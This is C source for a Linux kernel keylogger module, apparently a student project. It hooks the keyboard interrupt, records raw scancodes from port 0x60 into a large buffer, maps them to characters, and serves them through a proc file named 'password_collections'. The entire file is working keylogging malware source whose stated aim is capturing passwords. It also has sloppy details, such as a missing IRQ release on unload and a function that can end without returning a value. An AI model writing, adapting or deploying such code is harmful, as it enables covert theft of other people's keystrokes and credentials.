//Gus Tropea
//Projec3 key logger
// ps2 version
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/module.h>
#include <asm/io.h>
#include <linux/string.h>
#include <linux/proc_fs.h>
#include<linux/sched.h>
#include <asm/uaccess.h>
#include <linux/slab.h>
#define CAPS 0x3A
#define SHIFT_R 0x2A
#define SHIFT_L 0x36
#define BREAK_SR 0xB6
#define BREAK_SL 0xAA
#define PROC_FILE_NAME "password_collections"

char queue[10*(1024*1024)];
int inc=0;
int shift_on=0;
int caps_on=0;

char look_up(unsigned char x){
  char kbd_lower[]={0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'\
		    , '-', '=', '\b', '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', \
		    '[', ']', '\n', 0, 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'',\
		    '`', 0, '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0, '*', 0\
		    , ' ', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, '7', '8', '9', '+', '4', '5'\
		    , '6', '-', '1', '2', '3', '0', '.', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\
		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \
		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\
		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\
		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \
		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\
		    0, 0, 0, 0, '\n', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\
		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};

  char kbd_upper[]={0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'\
		    , '-', '=', '\b', '\t', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', \
		    '[', ']', '\n', 0, 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ';', '\'',\
		    '`', 0, '\\', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', ',', '.', '/', 0, '*', 0\
		    , ' ', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, '7', '8', '9', '+', '4', '5'\
		    , '6', '-', '1', '2', '3', '0', '.', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\
		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \
		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\
		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\
		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \
		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\
		    0, 0, 0, 0, '\n', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\
		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};

  char kbd_shift[]={0, 0, '!', '@', '#', '$', '%', '^', '&', '*', '(', ')'\
		    , '_', '+', '\b', '\t', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', \
		    '[', ']', '\n', 0, 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ':', '\'',\
		    '~', 0, '\\', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', ',', '.', '/', 0, '*', 0\
		    , ' ', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, '7', '8', '9', '+', '4', '5'\
		    , '6', '-', '1', '2', '3', '0', '.', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\
		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \
		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\
		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\
		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \
		    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\
		    0, 0, 0, 0, '\n', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\
		    , 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
  if(x==CAPS||x==SHIFT_R||x==SHIFT_L||x==BREAK_SR||x==BREAK_SL){
    if (x==CAPS){
      if (caps_on==0){
	caps_on=1;
	return 0;                                
      }
      else if(caps_on==1){
	caps_on=0;
	return 0;                                
      }
    }
    if (x==SHIFT_R|| x==SHIFT_L){
      shift_on=1;
      return 0;                                      
    }
    if (x==BREAK_SR||x==BREAK_SL){
      shift_on=0;
      return 0;                                  
    }
  }
  else {
    if (caps_on==1 && shift_on==0){
      return kbd_upper[x];
    }
    else if (shift_on==1){
      return kbd_shift[x];
    }
    else{
      return kbd_lower[x];
    }
  }
}


ssize_t read_file(struct file *filp,char *buf,size_t count,loff_t *offp ){
  int i=0;
  for(;i<inc; ++i){
    queue[i]=look_up(queue[i]);
  }
  copy_to_user(buf, queue, inc);
  int pinc=inc;
  inc=0;
  return pinc;
}

struct file_operations proc_fops = {
 read: read_file
};

irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs){
	static unsigned char scancode;
	scancode = inb (0x60);
	if(inc != (10*(1024*1024))){
	  queue[inc++]=scancode;
	  }
	else{
	  inc=0;
	  queue[inc++]=scancode;
	}
	//	printk("quee: %s", queue);
	return (irq_handler_t) IRQ_HANDLED;
}

int logger_init (void){
  proc_create(PROC_FILE_NAME,0,NULL,&proc_fops);
  return request_irq (1, (irq_handler_t) irq_handler, IRQF_SHARED, "using_irq_handler", (void *)(irq_handler));
}

void logger_cleanup(void) {
  remove_proc_entry(PROC_FILE_NAME,NULL);
}

MODULE_LICENSE ("GPL");
module_init(logger_init);
module_exit(logger_cleanup);
